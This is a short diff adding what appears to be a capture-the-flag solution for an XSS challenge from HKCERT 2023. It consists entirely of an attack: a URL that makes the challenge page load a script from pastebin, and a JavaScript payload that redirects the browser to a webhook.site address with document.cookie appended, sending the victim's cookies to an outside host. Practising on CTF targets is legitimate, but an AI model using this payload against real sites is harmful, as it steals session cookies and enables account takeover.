@@ -1,0 +1,3 @@
+http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232/?src=https://pastebin.com/dl/sDHnCvxE
+
+location='https://webhook.site/b8c29f62-003a-4fbf-a6fe-da70842251e5/?'+document.cookie
